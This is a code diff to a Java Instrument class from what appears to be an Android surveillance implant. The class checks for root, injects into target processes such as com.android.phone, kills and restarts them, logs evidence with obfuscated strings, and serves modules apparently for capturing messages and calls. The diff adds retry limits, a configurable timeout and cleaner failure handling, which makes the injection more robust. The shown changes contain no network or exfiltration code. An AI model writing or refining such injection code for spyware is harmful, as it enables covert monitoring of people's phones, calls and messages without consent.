@@ -31,6 +31,7 @@ public class Instrument implements Runnable{
 	private Semaphore sync_semaphore =null;
 	private Thread monitor;
 	private int killed = 0;
+	private int istrumentation_failures = 0;
 	private int restartedCounter = 0;
 	private boolean started = false;
 	private String instrumentationSuccessDir = null;
@@ -38,6 +39,7 @@ public class Instrument implements Runnable{
 	private boolean threadRunning = false;
 	private Thread thread = null;
 	private ArrayList<String> argList = new ArrayList<String>();
+	private int timeout = 180;
 
 
 	public Instrument(String process, String dump,Semaphore sem,String library,String owner) {
@@ -50,6 +52,7 @@ public class Instrument implements Runnable{
 		path = filesPath.getAbsolutePath();
 		dumpPath = dump;
 		sync_semaphore = sem;
+		istrumentation_failures = 0;
 	}
 	public Instrument(String process, String dump,Semaphore sem,String library,String _dexFile,String owner) {
 		this(process,dump,sem,library,owner);
@@ -74,6 +77,18 @@ public class Instrument implements Runnable{
 		}
 	}
 
+	/**
+	 * Modify the default timeouts (180 seconds) used
+	 * when startInstrumentation is called
+	 * @param timeout in seconds
+	 */
+	public void setTimeout(int timeout) {
+		this.timeout = timeout;
+	}
+
+	public boolean trialsBelowLimits(){
+		return killed<MAX_KILLED && istrumentation_failures<MAX_KILLED;
+	}
 	public boolean createMsgStorage() {
 		// Create storage directory
 
@@ -146,24 +161,36 @@ public class Instrument implements Runnable{
 
 		return true;
 	}
-	public boolean startInstrumentation() {
-		return startInstrumentation(180);
-	}
-	public boolean startInstrumentation(int timeout)  {
+
+	public boolean startInstrumentation()  {
+		if (!Status.haveRoot()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
+			}
+
+			return false;
+		}
 		if ( timeout<=0 ){
 			timeout = 180;
 		}
 		Date start = new Date();
 		long diff_sec = 0;
-		while(diff_sec<timeout && killed < MAX_KILLED) {
-			if( _startInstrumentation()  ){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(startInstrumentation): "+ proc +" Done");
+		while(diff_sec<timeout && trialsBelowLimits() ) {
+			try {
+				if (_startInstrumentation()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(startInstrumentation): " + proc + " Done");
+					}
+					break;
 				}
-				break;
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(startInstrumentation): "+proc+" failed, try again");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInstrumentation): " + proc + " failed, try again");
+				}
+				istrumentation_failures++;
+			}catch (InterruptedException e){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInstrumentation): semaphore not acquire, do not increment failures");
+				}
 			}
 			Utils.sleep(500);
 			diff_sec = (new Date().getTime() - start.getTime()) / 1000;
@@ -177,15 +204,8 @@ public class Instrument implements Runnable{
 		return isStarted();
 	}
 
-	public boolean _startInstrumentation() {
-		if (!Status.haveRoot()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(_startInstrumentation): Nope, we are not root");
-			}
-
-			return false;
-		}
-		if(killed > MAX_KILLED){
+	private boolean _startInstrumentation() throws InterruptedException {
+		if(!trialsBelowLimits()){
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(_startInstrumentation): too many trials");
 			}
@@ -280,7 +300,7 @@ public class Instrument implements Runnable{
 							}
 							EvidenceBuilder.info(proc + M.e(" injected"));
 							checkProcessMonitor(true);
-						}else if ( killed < MAX_KILLED) {
+						}else if (trialsBelowLimits()) {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " (_startInstrumentation) Kill "+proc);
 							}
@@ -311,7 +331,7 @@ public class Instrument implements Runnable{
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (_startInstrumentation) Error: "+proc + e);
 			}
-			return false;
+			throw e;
 		}
 
 		return started;
@@ -499,7 +519,7 @@ public class Instrument implements Runnable{
 					checkProcessMonitor(false);
 				}
 			}
-			if(killed>=MAX_KILLED){
+			if(!trialsBelowLimits()){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(run): too many kill stopping..");
 					watcherContinue = false ;
@@ -511,7 +531,9 @@ public class Instrument implements Runnable{
 			Check.log(TAG + "(run): asked to stop");
 		}
 		try {
-			stopInstrumentation();
+			if(isStarted()) {
+				stopInstrumentation();
+			}
 		}catch (Exception e){
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(run): failed to stopInstrumentation");
@@ -544,7 +566,7 @@ public class Instrument implements Runnable{
 		 * Hypothesis : modules that relay on the com.android.phone , i.e. ModuleMessages, ModuleCall can have problem
 		 * in case the process is killed while used?
 		 */
-		if(killed < MAX_KILLED) {
+		if(trialsBelowLimits()) {
 			stopInstrumentation();
 			if (isStarted()) {
 				if (Cfg.DEBUG) {
